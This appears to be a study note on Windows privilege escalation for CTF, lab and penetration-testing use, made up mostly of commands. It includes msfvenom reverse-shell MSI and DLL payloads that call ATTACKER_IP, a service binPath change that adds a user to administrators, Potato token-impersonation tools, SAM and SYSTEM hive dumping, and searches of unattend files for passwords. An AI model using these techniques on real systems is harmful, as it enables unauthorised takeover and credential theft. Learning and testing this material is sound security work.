---
title: Windows Privilege Escalation
tags:
  - fundamentals
  - windows
  - privilege-escalation
  - post-exploitation
  - advanced
topic: Post-Exploitation
difficulty: advanced
created: 2026-05-16
updated: 2026-05-16
source: HackTricks Windows privesc, WinPEAS, PayloadsAllTheThings
---

# Windows Privilege Escalation

## Overview
Windows privilege escalation is the process of moving from a low-privilege account to SYSTEM or Administrator after initial access. Windows has a distinct set of misconfigurations and features that are consistently abused in CTFs, lab environments, and real-world engagements.

## Why It Matters
Most initial footholds land you as a standard user or service account. The real value — credential dumps, persistence, lateral movement — requires SYSTEM or Administrator. Defenders must know these paths to close them.

---

## Initial Enumeration

Run these immediately after landing a shell:

```powershell
# Who are you?
whoami
whoami /priv
whoami /groups

# System info
systeminfo
hostname
echo %COMPUTERNAME%
echo %USERNAME%

# Network
ipconfig /all
route print
netstat -ano
arp -a

# Current user privileges
whoami /all

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Running processes
tasklist /svc
Get-Process

# Services
sc query
Get-Service

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Firewall rules
netsh advfirewall show allprofiles

# Environment variables
set
Get-ChildItem Env:

# Users and groups
net users
net localgroup administrators
Get-LocalUser
Get-LocalGroupMember Administrators
```

---

## Technique 1 — AlwaysInstallElevated

If this registry key is set, any user can install MSI packages as SYSTEM.

```powershell
# Check both keys — both must be 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit:**
```powershell
# Generate malicious MSI (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Install on target (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

---

## Technique 2 — Unquoted Service Paths

If a service binary path has spaces and is not quoted, Windows tries each prefix as an executable.

```powershell
# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable path:
# C:\Program Files\My App\service.exe
# Windows tries: C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My App\service.exe
```

**Exploit:** Place a malicious executable at the earliest ambiguous path (requires write permission there).

---

## Technique 3 — Weak Service Permissions

If you can modify a service's binary path, you can redirect it to a malicious executable.

```powershell
# Check service permissions with accesschk (Sysinternals)
accesschk.exe -ucqv * /accepteula

# Query a specific service
sc qc "ServiceName"

# Modify binary path (if you have permission)
sc config "ServiceName" binPath= "cmd.exe /c net localgroup administrators yourusername /add"
sc stop "ServiceName"
sc start "ServiceName"
```

---

## Technique 4 — Token Impersonation (Potato Attacks)

Service accounts often hold SeImpersonatePrivilege. This allows token impersonation to escalate to SYSTEM.

```powershell
# Check for SeImpersonatePrivilege
whoami /priv
```

If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is present, use a Potato exploit:

| Tool | Best For |
|------|----------|
| PrintSpoofer | Windows 10 / Server 2019 |
| RoguePotato | Windows 10 / Server 2019 |
| JuicyPotato | Older Windows (pre-1809) |
| GodPotato | Windows Server 2012–2022 |

```powershell
# PrintSpoofer example
PrintSpoofer.exe -i -c cmd

# JuicyPotato example
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

---

## Technique 5 — Stored Credentials

```powershell
# Windows Credential Manager
cmdkey /list

# Saved RDP credentials, auto-logon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattended install files (may contain plaintext passwords)
type C:\Windows\sysprep\sysprep.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\unattend.xml

# Search for password strings
findstr /si "password" *.txt *.xml *.config *.ini
Get-ChildItem -Recurse -Include *.txt,*.xml,*.config,*.ini | Select-String -Pattern "password"

# SAM database (if accessible)
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\system.bak
# Transfer and extract with impacket-secretsdump
```

---

## Technique 6 — Scheduled Tasks

```powershell
# List all scheduled tasks with details
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# Check if task script is writable
Get-ScheduledTask | ForEach-Object { $_.Actions } | Select-Object -ExpandProperty Execute
```

If a task runs as SYSTEM and calls a script you can write to, replace the script content with a reverse shell or user-add command.

---

## Technique 7 — DLL Hijacking

Windows searches for DLLs in a specific order. If an application directory is writable, a malicious DLL placed there can be loaded instead of the legitimate one.

**DLL search order:**
1. Application directory
2. System directory (C:\Windows\System32)
3. Windows directory (C:\Windows)
4. Current directory
5. Directories in PATH

```powershell
# Find missing DLLs using Process Monitor (Sysinternals)
# Filter: Result = NAME NOT FOUND, Path ends in .dll

# Generate malicious DLL (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o missing.dll
```

---

## Automated Enumeration Tools

```powershell
# WinPEAS — most comprehensive
.\winPEASx64.exe

# PowerUp (PowerSploit)
. .\PowerUp.ps1
Invoke-AllChecks

# Sherlock (legacy, unpatched vulnerabilities)
. .\Sherlock.ps1
Find-AllVulns

# Seatbelt (situational awareness)
.\Seatbelt.exe -group=all
```

---

## Bypassing UAC

```powershell
# Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# eventvwr.exe bypass (Windows 7/10)
# fodhelper.exe bypass (Windows 10)
# Both exploit auto-elevation and registry key hijacking
```

---

## Key Terms

| Term | Definition |
|------|------------|
| SYSTEM | Highest privilege account on a Windows machine |
| UAC | User Account Control — prompts for elevation confirmation |
| SAM | Security Account Manager — stores local user password hashes |
| Token | Security object that describes privileges of a process/thread |
| SeImpersonatePrivilege | Right to impersonate a client after authentication |
| MSI | Microsoft Installer package format |
| DLL | Dynamic Link Library — shared code loaded by applications |
| SPN | Service Principal Name — identifier for a service running on a host |

## Sources

Carlos Polop. (2024). *Windows local privilege escalation*. HackTricks. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

Dmcxblue. (2023). *Windows privilege escalation*. PayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Tib3rius. (2022). *Windows privilege escalation for OSCP & beyond*. Udemy course notes.

---
<- [[Fundamentals-MOC]]
